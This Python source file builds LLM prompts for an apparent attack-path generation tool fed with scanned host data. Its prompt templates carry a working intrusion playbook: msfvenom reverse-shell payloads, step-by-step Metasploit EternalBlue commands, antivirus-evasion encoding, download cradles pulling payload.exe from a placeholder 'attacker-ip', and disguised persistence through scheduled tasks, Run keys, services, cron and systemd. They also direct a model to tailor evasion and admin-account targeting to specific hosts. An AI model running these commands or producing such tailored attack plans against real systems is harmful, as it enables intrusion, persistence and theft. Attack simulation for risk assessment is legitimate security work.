"""
Prompt building logic for LLM interactions.
Centralizes all prompt templates and construction for attack path generation.
"""
from app.models.host import InputHost
from app.models.attack_context import AttackContext


class PromptBuilder:
    """Builds dynamic prompts for attack path generation based on available data."""
    
    SYSTEM_MESSAGE = (
        "You are a MITRE ATT&CK and Cyber Kill Chain expert specializing in offensive security. "
        "Your role is to generate realistic, step-by-step attack sequences based on vulnerability "
        "and exposure data provided by external collectors. Structure attack paths following the "
        "Cyber Kill Chain phases and map each action to relevant MITRE ATT&CK techniques. "
        "Provide detailed technical descriptions and include code examples when applicable. "
        "Tailor your attack path based on the specific context provided - consider security controls, "
        "network segmentation, identity management, and all available asset details."
    )
    
    @staticmethod
    def _format_list(items: list | None, default: str = "None detected") -> str:
        """Format a list for display, handling None and empty lists."""
        if not items:
            return default
        return '\n  • ' + '\n  • '.join(str(item) for item in items)
    
    @staticmethod
    def _format_value(value, default: str = "Not specified") -> str:
        """Format a single value for display."""
        if value is None:
            return default
        if isinstance(value, bool):
            return "Yes" if value else "No"
        return str(value)
    
    @staticmethod
    def build_attack_analysis_prompt(host: InputHost) -> str:
        """
        Build a dynamic prompt for attack path generation.
        
        Intelligently constructs the prompt based on available data fields.
        Only includes sections where data is provided, making the prompt
        concise and relevant to the specific host context.
        
        Args:
            host: Input host data from external collector
            
        Returns:
            Formatted prompt string for LLM to generate attack sequence
        """
        pb = PromptBuilder  # Alias for shorter calls
        
        # Build sections dynamically based on available data
        sections = []
        
        # ==================== CORE SYSTEM INFO ====================
        if host.platform or host.version_os:
            core_info = []
            if host.platform:
                core_info.append(f"- Platform: {host.platform}")
            if host.version_os:
                core_info.append(f"- OS Version: {host.version_os}")
            if host.os_end_of_life:
                core_info.append(f"- ⚠️ OS END-OF-LIFE: System is running unsupported OS version")
            sections.append("=== CORE SYSTEM INFO ===\n" + "\n".join(core_info))
        
        # ==================== ASSET IDENTIFICATION ====================
        asset_info = []
        if host.asset_name:
            asset_info.append(f"- Asset Name: {host.asset_name}")
        if host.asset_id:
            asset_info.append(f"- Asset ID: {host.asset_id}")
        if host.fqdn:
            asset_info.append(f"- FQDN: {host.fqdn}")
        if host.ip_addresses:
            asset_info.append(f"- IP Addresses: {', '.join(host.ip_addresses)}")
        if host.mac_addresses:
            asset_info.append(f"- MAC Addresses: {', '.join(host.mac_addresses)}")
        
        if asset_info:
            sections.append("=== ASSET IDENTIFICATION ===\n" + "\n".join(asset_info))
        
        # ==================== ASSET CONTEXT & RISK ====================
        context_info = []
        if host.asset_criticality:
            context_info.append(f"- 🎯 Asset Criticality: {host.asset_criticality}")
        if host.business_role:
            context_info.append(f"- Business Role: {host.business_role}")
        if host.environment:
            context_info.append(f"- Environment: {host.environment}")
        if host.data_classification:
            context_info.append(f"- Data Classification: {host.data_classification}")
        
        if context_info:
            sections.append("=== ASSET CONTEXT (HIGH PRIORITY FOR RISK ASSESSMENT) ===\n" + "\n".join(context_info))
        
        # ==================== NETWORK & EXPOSURE ====================
        network_info = []
        if host.network_segment:
            network_info.append(f"- Network Segment: {host.network_segment}")
        if host.internet_exposed is not None:
            exposure = "YES - Exposed to Internet 🌐" if host.internet_exposed else "No - Internal only"
            network_info.append(f"- Internet Exposed: {exposure}")
        if host.open_ports:
            network_info.append(f"- Open Ports: {', '.join(map(str, host.open_ports))}")
        if host.services:
            network_info.append(f"- Services:{pb._format_list(host.services)}")
        if host.firewall_rules:
            network_info.append(f"- Firewall Rules:{pb._format_list(host.firewall_rules)}")
        
        if network_info:
            sections.append("=== NETWORK & EXPOSURE ===\n" + "\n".join(network_info))
        
        # ==================== SECURITY CONTROLS ====================
        security_info = []
        if host.security_controls:
            security_info.append(f"- Security Controls:{pb._format_list(host.security_controls)}")
        if host.edr_agent:
            security_info.append(f"- EDR Agent: {host.edr_agent}")
        if host.antivirus_status:
            security_info.append(f"- Antivirus Status: {host.antivirus_status}")
        if host.firewall_status:
            security_info.append(f"- Firewall Status: {host.firewall_status}")
        if host.encryption_status:
            security_info.append(f"- Disk Encryption: {host.encryption_status}")
        
        if security_info:
            sections.append("=== SECURITY CONTROLS (CONSIDER FOR EVASION) ===\n" + "\n".join(security_info))
        
        # ==================== VULNERABILITIES & PATCH STATUS ====================
        vuln_info = []
        if host.vulnerabilities:
            vuln_info.append(f"- Known Vulnerabilities:{pb._format_list(host.vulnerabilities)}")
        if host.vulnerability_score is not None:
            vuln_info.append(f"- Vulnerability Score: {host.vulnerability_score}")
        if host.critical_vuln_count is not None:
            vuln_info.append(f"- Critical Vulnerabilities: {host.critical_vuln_count}")
        if host.patch_level:
            vuln_info.append(f"- Patch Level: {host.patch_level}")
        if host.missing_patches:
            vuln_info.append(f"- Missing Patches:{pb._format_list(host.missing_patches)}")
        
        if vuln_info:
            sections.append("=== VULNERABILITIES & PATCH STATUS ===\n" + "\n".join(vuln_info))
        
        # ==================== IDENTITY & ACCESS MANAGEMENT ====================
        identity_info = []
        if host.domain_membership:
            identity_info.append(f"- Domain: {host.domain_membership}")
        if host.organizational_unit:
            identity_info.append(f"- Organizational Unit: {host.organizational_unit}")
        if host.user_accounts:
            identity_info.append(f"- User Accounts:{pb._format_list(host.user_accounts)}")
        if host.admin_accounts:
            identity_info.append(f"- 🔑 Admin Accounts:{pb._format_list(host.admin_accounts)}")
        if host.service_accounts:
            identity_info.append(f"- Service Accounts:{pb._format_list(host.service_accounts)}")
        if host.mfa_enabled is not None:
            mfa = "Enabled ✓" if host.mfa_enabled else "NOT ENABLED ⚠️"
            identity_info.append(f"- Multi-Factor Authentication: {mfa}")
        if host.password_policy:
            identity_info.append(f"- Password Policy: {host.password_policy}")
        
        if identity_info:
            sections.append("=== IDENTITY & ACCESS MANAGEMENT ===\n" + "\n".join(identity_info))
        
        # ==================== INSTALLED SOFTWARE ====================
        software_info = []
        if host.installed_software:
            software_info.append(f"- Installed Software:{pb._format_list(host.installed_software)}")
        if host.database_software:
            software_info.append(f"- Database Software:{pb._format_list(host.database_software)}")
        if host.development_tools:
            software_info.append(f"- Development Tools:{pb._format_list(host.development_tools)}")
        if host.browser_extensions:
            software_info.append(f"- Browser Extensions:{pb._format_list(host.browser_extensions)}")
        
        if software_info:
            sections.append("=== INSTALLED SOFTWARE (ADDITIONAL ATTACK VECTORS) ===\n" + "\n".join(software_info))
        
        # ==================== MISCONFIGURATIONS ====================
        config_info = []
        if host.configurations:
            config_info.append(f"- ⚠️ Misconfigurations:{pb._format_list(host.configurations)}")
        if host.security_recommendations:
            config_info.append(f"- Security Recommendations:{pb._format_list(host.security_recommendations)}")
        if host.compliance_gaps:
            config_info.append(f"- Compliance Gaps:{pb._format_list(host.compliance_gaps)}")
        
        if config_info:
            sections.append("=== MISCONFIGURATIONS & WEAKNESSES ===\n" + "\n".join(config_info))
        
        # ==================== CLOUD & CONTAINER ====================
        cloud_info = []
        if host.cloud_provider:
            cloud_info.append(f"- Cloud Provider: {host.cloud_provider}")
        if host.cloud_instance_type:
            cloud_info.append(f"- Instance Type: {host.cloud_instance_type}")
        if host.cloud_iam_roles:
            cloud_info.append(f"- IAM Roles:{pb._format_list(host.cloud_iam_roles)}")
        if host.container_runtime:
            cloud_info.append(f"- Container Runtime: {host.container_runtime}")
        if host.kubernetes_cluster:
            cloud_info.append(f"- Kubernetes Cluster: {host.kubernetes_cluster}")
        
        if cloud_info:
            sections.append("=== CLOUD & CONTAINER ENVIRONMENT ===\n" + "\n".join(cloud_info))
        
        # ==================== BACKUP & RECOVERY ====================
        backup_info = []
        if host.backup_system:
            backup_info.append(f"- Backup System: {host.backup_system}")
        if host.backup_location:
            backup_info.append(f"- Backup Location: {host.backup_location}")
        
        if backup_info:
            sections.append("=== BACKUP & RECOVERY (POTENTIAL EXFILTRATION TARGET) ===\n" + "\n".join(backup_info))
        
        # ==================== THREAT INTELLIGENCE ====================
        threat_info = []
        if host.threat_intel_matches:
            threat_info.append(f"- 🔴 Threat Intel Matches:{pb._format_list(host.threat_intel_matches)}")
        if host.known_exploits:
            threat_info.append(f"- Known Exploits:{pb._format_list(host.known_exploits)}")
        
        if threat_info:
            sections.append("=== THREAT INTELLIGENCE ===\n" + "\n".join(threat_info))
        
        # Build the complete prompt
        target_info = "\n\n".join(sections) if sections else "Minimal information available - generate generic attack path"
        
        prompt = f"""Generate a realistic attack path for the following target based on collected vulnerability and exposure data.

TARGET INFORMATION (from external collector):

{target_info}

YOUR TASK:
1. Generate a detailed, step-by-step attack path following the Cyber Kill Chain phases
2. Map each action to relevant MITRE ATT&CK techniques (TTP - Tactics, Techniques, and Procedures)
3. **CRITICAL**: Tailor the attack path to the SPECIFIC CONTEXT provided above:
   - If security controls (EDR, firewall) are present, include evasion techniques
   - If cloud/container environments are detected, include cloud-native attack techniques
   - If misconfigurations are listed, exploit them specifically
   - If admin accounts are identified, target them for privilege escalation
   - If MFA is disabled, note easier credential access
   - If asset criticality is high, emphasize the business impact
   - Consider network segmentation for lateral movement strategies
4. Provide technical details and include code examples when applicable
5. Assess the overall risk level based on exploitability, impact, AND asset criticality

Attack Path Structure - Follow Cyber Kill Chain Phases:

1. **Reconnaissance**: Collect public and observable information about the target to identify assets, services, and potential exposure (passive, non-actionable). Map to MITRE techniques like T1595 (Active Scanning), T1592 (Gather Victim Host Information).

2. **Weaponization**: Design or select a capability or payload tailored to observed weaknesses. **Create actual malicious artifacts** (executables, scripts, documents) using tools like:
   - msfvenom for Windows/Linux payloads (e.g., 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o payload.exe')
   - PowerShell Empire for PowerShell-based payloads
   - Custom exploit code compilation
   - Malicious document generation (maldocs)
   
   **Include specific commands showing artifact creation** and **name the files** (e.g., "backdoor.exe", "update.ps1") so they can be referenced in later stages (Installation, Persistence). Map to MITRE techniques like T1587.001 (Develop Capabilities: Malware), T1588.001 (Obtain Capabilities: Malware).

3. **Delivery**: Describe the vector used to deliver the capability to the target. **Include detailed step-by-step procedures** when using Metasploit or similar exploitation frameworks:

   **Metasploit Exploitation Framework - Detailed Procedure**:
   Step 1 - Select and configure exploit:
   • 'use exploit/windows/smb/ms17_010_eternalblue' (example for EternalBlue)
   • 'show options' (display all configurable parameters)
   • 'set RHOST <target-ip>' (set target IP address)
   • 'set LHOST <attacker-ip>' (set attacker listening IP)
   • 'set LPORT 4444' (set callback port)
   
   Step 2 - Select payload:
   • 'set PAYLOAD windows/meterpreter/reverse_tcp'
   • 'show options' (verify payload parameters)
   
   Step 3 - Configure payload options:
   • 'set LHOST <attacker-listening-ip>'
   • 'set LPORT 4444' (must match exploit config)
   • 'check' (verify target is vulnerable before exploit)
   
   Step 4 - Launch exploit:
   • 'run' or 'exploit' (execute the attack)
   • Monitor for session establishment
   
   Step 5 - Post-exploitation:
   • 'sessions -l' (list active sessions)
   • 'sessions -i <session-id>' (interact with session)
   • 'getuid' (verify privileges on target)
   • 'sysinfo' (gather system information)
   
   **Alternative Delivery Methods**:
   - **Network packet injection**: Use tools like msfvenom to craft packets directly or via proxychains
   - **File-based delivery**: SMB shares, FTP, HTTP downloads embedded in documents
   - **Phishing**: Malicious attachments, shortened URLs with payload, social engineering
   - **Watering hole**: Compromise legitimate websites, inject payload in web pages
   - **Supply chain**: Compromise software repositories, update servers
   
   **Important Considerations**:
   - Network connectivity: Ensure attacker can receive reverse callback on LHOST:LPORT
   - Firewall rules: Verify outbound traffic on selected port is allowed
   - Encoding: Use payload encoding to evade antivirus (e.g., 'set ENCODER x86/shikata_ga_nai')
   - Multi-stage payloads: Staged payloads reduce initial footprint (windows/meterpreter/reverse_tcp)
   
   Map to MITRE techniques: T1566 (Phishing), T1190 (Exploit Public-Facing Application), T1566.002 (Phishing: Spearphishing Link).

4. **Exploitation**: Trigger vulnerability or misconfiguration to gain initial access. Include specific exploitation techniques, CVE details, and code examples where applicable. Map to MITRE Initial Access techniques.

5. **Installation**: Establish persistent foothold by deploying tools, backdoors, or mechanisms **created during Weaponization**. **Reference the specific artifacts by name** (e.g., "Upload payload.exe created in Weaponization stage"). 
   
   **CRITICAL - Show DETAILED file transfer/upload process**:
   - **Meterpreter sessions**: Use 'upload' command with full paths:
     • 'upload /path/to/payload.exe C:\\Windows\\Temp\\payload.exe'
     • 'upload backdoor.exe C:\\Users\\Public\\update.exe'
   - **SMB/CIFS**: Mount shares and copy files:
     • 'smbclient //target/C$ -U user%pass -c "put payload.exe Windows\\Temp\\payload.exe"'
     • 'net use \\\\target\\C$ /user:domain\\user password && copy payload.exe \\\\target\\C$\\Windows\\Temp\\'
   - **PowerShell remoting**: Transfer via Base64 or download cradles:
     • 'powershell -c "IEX(New-Object Net.WebClient).DownloadFile(\'http://attacker-ip/payload.exe\',\'C:\\Temp\\payload.exe\')"'
     • 'certutil -urlcache -split -f http://attacker-ip/payload.exe C:\\Temp\\payload.exe'
   - **Linux targets**: Use scp, wget, curl, or netcat:
     • 'scp payload.elf user@target:/tmp/update'
     • 'wget http://attacker-ip/payload.elf -O /tmp/.hidden'
     • 'curl http://attacker-ip/payload.elf -o /var/tmp/systemd'
   
   **Then show persistence setup (IMPORTANT - use correct syntax for Windows cmd.exe)**:
   - **Scheduled tasks (Windows cmd.exe)**: 'schtasks /create /tn WindowsUpdate /tr C:\\Temp\\payload.exe /sc onlogon /ru SYSTEM'
   - **Scheduled tasks (from Meterpreter)**: 'execute -f cmd.exe -a "/c schtasks /create /tn WindowsUpdate /tr C:\\\\Temp\\\\payload.exe /sc onlogon /ru SYSTEM"'
   - **Registry run keys (SIMPLER alternative)**: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d C:\\Temp\\payload.exe'
   - **Services**: 'sc create UpdateService binPath= C:\\Temp\\payload.exe start= auto && sc start UpdateService'
   - **Cron jobs (Linux)**: 'echo "@reboot /tmp/.hidden" | crontab -'
   - **systemd service (Linux)**: 'echo "[Unit]\\nDescription=Update Service\\n[Service]\\nExecStart=/tmp/.hidden\\n[Install]\\nWantedBy=multi-user.target" > /etc/systemd/system/update.service && systemctl enable update.service'
   
   **File placement considerations**:
   - User-writable locations: C:\\Users\\Public, C:\\ProgramData, C:\\Windows\\Temp, /tmp, /var/tmp
   - Hidden locations: AppData\\Roaming, /home/user/.config, /var/lib
   - Legitimate-looking paths: C:\\Windows\\System32\\wbem, C:\\Program Files\\Common Files
   
   **CRITICAL SYNTAX RULES - Scheduled Tasks in Windows cmd.exe**:
   - Task name and executable path should NOT have quotes when using cmd.exe
   - Correct syntax: 'schtasks /create /tn WindowsUpdate /tr C:\\Temp\\payload.exe /sc onlogon /ru SYSTEM'
   - If path has spaces, use 8.3 short names (e.g., C:\\PROGRA~1) or place file in no-space directory
   - Alternative: Use registry run keys (simpler, no quote/syntax issues)
   
   Map to MITRE techniques: T1105 (Ingress Tool Transfer), T1053 (Scheduled Task/Job), T1543 (Create or Modify System Process), T1547 (Boot or Logon Autostart Execution).

6. **Command and Control (C2)**: Define the channel for remote control and coordination. Include protocols, tools (e.g., Metasploit, Cobalt Strike, custom C2), and communication methods. Map to MITRE C2 techniques like T1071 (Application Layer Protocol), T1573 (Encrypted Channel).

7. **Actions on Objectives**: Describe goals achieved after establishing control such as data access, lateral movement, privilege escalation, data exfiltration, or system disruption. Map to MITRE techniques like T1003 (Credential Dumping), T1021 (Remote Services), T1567 (Exfiltration Over Web Service).

Guidelines:
- Each step must be a single, detailed string describing one concrete attacker action
- Include technical specifics: commands, tools, protocols, file paths when relevant
- Add code examples for exploitation and post-exploitation phases
- Map each phase to specific MITRE ATT&CK technique IDs (T####)
- Number of steps should reflect a realistic progression for the given vulnerabilities
- Ensure logical flow from reconnaissance through objectives
- Be realistic about what an attacker could achieve with the given attack surface

Format your response as JSON with this exact structure:
{{
    "attack_path": [
        "Reconnaissance: [Detailed description with SPECIFIC context from target info, MITRE mapping]",
        "Weaponization: [Description considering security controls present, MITRE mapping]",
        "Delivery: [Description considering network exposure and segmentation, MITRE mapping]",
        "Exploitation: [Detailed exploitation of SPECIFIC vulnerabilities/misconfigurations listed, with CVE, commands, code examples, MITRE mapping]",
        "Installation: [Persistence mechanism considering EDR/security controls, MITRE mapping]",
        "Command and Control: [C2 setup considering firewall rules and network monitoring, MITRE mapping]",
        "Actions on Objectives: [Goals considering asset criticality and data classification, MITRE mapping]"
    ]
}}

Rules:
- Always return a valid JSON object with key "attack_path"
- Each attack_path element must be a single string describing one Cyber Kill Chain phase
- Always map actions to equivalent MITRE ATT&CK technique IDs (T####)
- **REFERENCE SPECIFIC CONTEXT**: Use actual details from the target information (e.g., specific CVEs, account names, software versions, misconfigurations)
- Include code examples, commands, or technical details when describing exploitation
- Ensure output is valid, parseable JSON with no additional text outside the JSON structure

Generate a realistic, context-aware attack sequence now."""
        
        return prompt
    
    # =========================================================================
    # STAGE-LEVEL PROMPTING WITH CONTINUITY PRESERVATION
    # =========================================================================
    
    @staticmethod
    def build_reconnaissance_prompt(host: InputHost) -> str:
        """
        Stage 1: Reconnaissance (no prior context needed).
        
        Initiates the attack path with passive intelligence gathering.
        No prior stages to reference.
        """
        pb = PromptBuilder
        
        sections = []
        
        # Core system info
        if host.platform or host.version_os:
            core_info = []
            if host.platform:
                core_info.append(f"- Platform: {host.platform}")
            if host.version_os:
                core_info.append(f"- OS Version: {host.version_os}")
            if host.os_end_of_life:
                core_info.append(f"- ⚠️ OS END-OF-LIFE: Unsupported version")
            sections.append("TARGET SYSTEM:\n" + "\n".join(core_info))
        
        # Network exposure
        network_info = []
        if host.internet_exposed is not None:
            exposure = "Internet-exposed 🌐" if host.internet_exposed else "Internal only"
            network_info.append(f"- Exposure: {exposure}")
        if host.open_ports:
            network_info.append(f"- Open Ports: {', '.join(map(str, host.open_ports))}")
        if host.services:
            network_info.append(f"- Services: {pb._format_list(host.services)}")
        if network_info:
            sections.append("NETWORK SURFACE:\n" + "\n".join(network_info))
        
        # Vulnerabilities
        if host.vulnerabilities:
            sections.append(f"KNOWN VULNERABILITIES: {pb._format_list(host.vulnerabilities)}")
        
        # Security controls
        security_info = []
        if host.edr_agent:
            security_info.append(f"- EDR: {host.edr_agent}")
        if host.firewall_status:
            security_info.append(f"- Firewall: {host.firewall_status}")
        if security_info:
            sections.append("SECURITY CONTROLS:\n" + "\n".join(security_info))
        
        target_info = "\n\n".join(sections) if sections else "Minimal information available"
        
        return f"""STAGE 1: RECONNAISSANCE

Target Information:
{target_info}

YOUR TASK:
1. Analyze the target to identify exposed services, vulnerabilities, and attack surface
2. Use passive reconnaissance techniques (MITRE T1595, T1592, T1598)
3. Determine the most promising attack vectors based on discovered information
4. Map findings to MITRE ATT&CK techniques

Output: One detailed string describing reconnaissance findings, discovered attack vectors, and initial assessment."""
    
    @staticmethod
    def build_weaponization_prompt(host: InputHost, context: AttackContext) -> str:
        """
        Stage 2: Weaponization WITH PRIOR RECONNAISSANCE FINDINGS.
        
        Creates weaponized payloads specific to what reconnaissance discovered.
        Must reference vulnerabilities and services found in Stage 1.
        """
        pb = PromptBuilder
        
        sections = []
        
        # Target platform
        if host.platform:
            sections.append(f"TARGET PLATFORM: {host.platform}")
        
        # What recon found
        if context.reconnaissance:
            sections.append(f"RECONNAISSANCE FINDINGS:\n{context.reconnaissance}")
        
        # Services and vulnerabilities
        services_info = []
        if host.services:
            services_info.append(f"- Services: {pb._format_list(host.services)}")
        if host.vulnerabilities:
            services_info.append(f"- Vulnerabilities: {pb._format_list(host.vulnerabilities)}")
        if services_info:
            sections.append("TARGET ATTACK SURFACE:\n" + "\n".join(services_info))
        
        # Security controls
        if host.security_controls:
            sections.append(f"SECURITY CONTROLS TO BYPASS: {pb._format_list(host.security_controls)}")
        
        target_info = "\n\n".join(sections)
        
        return f"""STAGE 2: WEAPONIZATION

{target_info}

YOUR TASK:
1. Create weaponized payloads SPECIFICALLY for the vulnerabilities found in reconnaissance
2. Match payload architecture to target platform (Windows/Linux/etc)
3. Include specific artifact names (e.g., payload.exe, backdoor.sh, update.ps1)
4. Consider security controls for evasion techniques
5. Map to MITRE techniques (T1587.001, T1588.001, etc.)

CRITICAL: Reference the SPECIFIC vulnerabilities from reconnaissance.
If recon found CVE-2017-0144 (EternalBlue), create Windows/Meterpreter payload.
Name your artifacts specifically - they will be referenced in Installation stage.

Output: One detailed string describing payload creation with SPECIFIC file names and commands."""
    
    @staticmethod
    def build_delivery_prompt(host: InputHost, context: AttackContext) -> str:
        """
        Stage 3: Delivery WITH PAYLOAD AND RECON CONTEXT.
        
        Designs delivery method that uses the payload created in Weaponization
        and leverages services/vulnerabilities found in Reconnaissance.
        """
        pb = PromptBuilder
        
        sections = []
        
        # Recon findings
        if context.reconnaissance:
            sections.append(f"RECONNAISSANCE FINDINGS:\n{context.reconnaissance}")
        
        # Weaponization output
        if context.weaponization:
            sections.append(f"PAYLOAD CREATED IN WEAPONIZATION:\n{context.weaponization}")
        
        # Network exposure
        network_info = []
        if host.internet_exposed is not None:
            exposure = "Internet-exposed" if host.internet_exposed else "Internal network"
            network_info.append(f"- Network: {exposure}")
        if host.open_ports:
            network_info.append(f"- Open Ports: {', '.join(map(str, host.open_ports))}")
        if host.services:
            network_info.append(f"- Services: {pb._format_list(host.services)}")
        if network_info:
            sections.append("DELIVERY VECTOR:\n" + "\n".join(network_info))
        
        target_info = "\n\n".join(sections)
        
        return f"""STAGE 3: DELIVERY

{target_info}

YOUR TASK:
1. Design delivery method that USES the payload created in Weaponization
2. Leverage vulnerabilities/services from Reconnaissance (match attack vectors)
3. Consider network exposure and firewall rules
4. Provide step-by-step Metasploit or alternative delivery procedure
5. Map to MITRE techniques (T1566, T1190, T1566.002, etc.)

CRITICAL: Your delivery method MUST align with:
- The payload created in Weaponization (format, architecture)
- The vulnerabilities found in Reconnaissance (exploit target services)
- Do NOT invent new attack vectors not mentioned in prior stages

Output: One detailed string with specific delivery procedure (Metasploit commands or alternative method)."""
    
    @staticmethod
    def build_exploitation_prompt(host: InputHost, context: AttackContext) -> str:
        """
        Stage 4: Exploitation WITH DELIVERY AND RECON CONTEXT.
        
        Executes the delivery to trigger exploitation.
        References specific CVEs from prior stages.
        """
        pb = PromptBuilder
        
        sections = []
        
        # Prior stages
        if context.reconnaissance:
            sections.append(f"RECONNAISSANCE: {context.reconnaissance[:200]}...")
        if context.weaponization:
            sections.append(f"PAYLOAD: {context.weaponization[:200]}...")
        if context.delivery:
            sections.append(f"DELIVERY METHOD: {context.delivery[:200]}...")
        
        # Vulnerabilities
        if host.vulnerabilities:
            sections.append(f"TARGET VULNERABILITIES: {pb._format_list(host.vulnerabilities)}")
        
        target_info = "\n\n".join(sections)
        
        return f"""STAGE 4: EXPLOITATION

{target_info}

YOUR TASK:
1. Execute the delivery method from Stage 3
2. Exploit SPECIFIC CVEs/vulnerabilities mentioned in prior stages
3. Confirm successful exploitation and access level achieved
4. Include detailed exploitation steps and commands
5. Map to MITRE techniques (T1190, T1203, etc.)

CRITICAL: This exploitation MUST align with:
- The delivery method described in Stage 3
- The vulnerabilities found in Reconnaissance
- Do NOT invent new CVEs or attack vectors

Output: One detailed string describing exploitation execution and initial access achieved."""
    
    @staticmethod
    def build_installation_prompt(host: InputHost, context: AttackContext) -> str:
        """
        Stage 5: Installation WITH PAYLOAD NAME REFERENCE (CRITICAL).
        
        Establishes persistence using specific artifacts created in Weaponization.
        MUST reference payload names from earlier stages.
        """
        pb = PromptBuilder
        
        sections = []
        
        # Weaponization payloads (CRITICAL for artifact names)
        if context.weaponization:
            sections.append(f"PAYLOADS FROM WEAPONIZATION:\n{context.weaponization}")
        
        # Delivery and exploitation confirmation
        if context.delivery:
            sections.append(f"DELIVERY METHOD: {context.delivery[:300]}...")
        if context.exploitation:
            sections.append(f"EXPLOITATION RESULT: {context.exploitation[:300]}...")
        
        # Target OS and access
        platform_info = []
        if host.platform:
            platform_info.append(f"- Platform: {host.platform}")
        if host.admin_accounts:
            platform_info.append(f"- Admin Accounts: {pb._format_list(host.admin_accounts)}")
        if platform_info:
            sections.append("TARGET CONTEXT:\n" + "\n".join(platform_info))
        
        target_info = "\n\n".join(sections)
        
        return f"""STAGE 5: INSTALLATION & PERSISTENCE

{target_info}

YOUR TASK:
1. Establish persistence using the SPECIFIC ARTIFACT NAMES from Weaponization
2. Upload/transfer payloads using methods confirmed in Delivery
3. Configure persistence mechanism (scheduled tasks, registry, cron, systemd, etc.)
4. Map to MITRE techniques (T1105, T1053, T1543, T1547, etc.)

⚠️ CRITICAL CONTINUITY RULES:
- REFERENCE artifact names FROM Weaponization BY NAME
  ✓ "Upload payload.exe (from Weaponization) to C:\\Temp\\payload.exe"
  ✗ "Upload backdoor.exe" (if Weaponization created payload.exe)
- Use persistence method appropriate for target platform
- Ensure file transfer path is logically consistent with prior stages
- Do NOT invent new artifacts

Output: One detailed string with SPECIFIC file names and persistence mechanism."""
    
    @staticmethod
    def build_command_and_control_prompt(host: InputHost, context: AttackContext) -> str:
        """
        Stage 6: Command and Control WITH FULL PRIOR CONTEXT.
        
        Establishes C2 channel that works with persistence from Installation.
        """
        pb = PromptBuilder
        
        sections = []
        
        # Attack progression
        attack_summary = []
        if context.reconnaissance:
            attack_summary.append(f"Recon: {context.reconnaissance[:150]}...")
        if context.weaponization:
            attack_summary.append(f"Payload: {context.weaponization[:150]}...")
        if context.installation:
            attack_summary.append(f"Persistence: {context.installation[:150]}...")
        if attack_summary:
            sections.append("ATTACK PROGRESSION:\n" + "\n".join(attack_summary))
        
        # Network context
        network_info = []
        if host.internet_exposed is not None:
            exposure = "Internet-exposed" if host.internet_exposed else "Internal"
            network_info.append(f"- Network: {exposure}")
        if host.firewall_rules:
            network_info.append(f"- Firewall Rules: {pb._format_list(host.firewall_rules)}")
        if host.security_controls:
            network_info.append(f"- Security: {pb._format_list(host.security_controls)}")
        if network_info:
            sections.append("NETWORK CONTEXT:\n" + "\n".join(network_info))
        
        target_info = "\n\n".join(sections)
        
        return f"""STAGE 6: COMMAND & CONTROL

{target_info}

YOUR TASK:
1. Establish C2 channel FROM the persistent payload established in Installation
2. Consider network exposure (internet vs internal)
3. Account for firewall rules and security monitoring
4. Include detailed C2 setup (protocols, tools, listeners)
5. Map to MITRE techniques (T1071, T1573, T1008, etc.)

Output: One detailed string describing C2 channel setup."""
    
    @staticmethod
    def build_actions_on_objectives_prompt(host: InputHost, context: AttackContext) -> str:
        """
        Stage 7: Actions on Objectives WITH FULL ATTACK CHAIN CONTEXT.
        
        Determines post-exploitation objectives based on complete attack chain.
        """
        pb = PromptBuilder
        
        sections = []
        
        # Full attack chain
        chain_summary = []
        if context.reconnaissance:
            chain_summary.append(f"1. Recon: {context.reconnaissance[:120]}...")
        if context.weaponization:
            chain_summary.append(f"2. Payload: {context.weaponization[:120]}...")
        if context.delivery:
            chain_summary.append(f"3. Delivery: {context.delivery[:120]}...")
        if context.exploitation:
            chain_summary.append(f"4. Exploitation: {context.exploitation[:120]}...")
        if context.installation:
            chain_summary.append(f"5. Installation: {context.installation[:120]}...")
        if context.command_and_control:
            chain_summary.append(f"6. C2: {context.command_and_control[:120]}...")
        if chain_summary:
            sections.append("FULL ATTACK CHAIN:\n" + "\n".join(chain_summary))
        
        # High-value targets
        target_info_list = []
        if host.asset_criticality:
            target_info_list.append(f"- Criticality: {host.asset_criticality}")
        if host.business_role:
            target_info_list.append(f"- Role: {host.business_role}")
        if host.database_software:
            target_info_list.append(f"- Databases: {pb._format_list(host.database_software)}")
        if host.development_tools:
            target_info_list.append(f"- Dev Tools: {pb._format_list(host.development_tools)}")
        if host.admin_accounts:
            target_info_list.append(f"- Admin Accounts: {pb._format_list(host.admin_accounts)}")
        if target_info_list:
            sections.append("HIGH-VALUE TARGETS:\n" + "\n".join(target_info_list))
        
        chain_info = "\n\n".join(sections)
        
        return f"""STAGE 7: ACTIONS ON OBJECTIVES

{chain_info}

YOUR TASK:
1. Leverage the access established through the full attack chain above
2. Pursue objectives based on asset value (criticality, data classification, business role)
3. Target high-value systems (databases, admin accounts, dev tools)
4. Consider privilege level achieved through exploitation
5. Map to MITRE techniques (T1003, T1021, T1567, T1041, etc.)

Output: One detailed string describing post-exploitation objectives."""
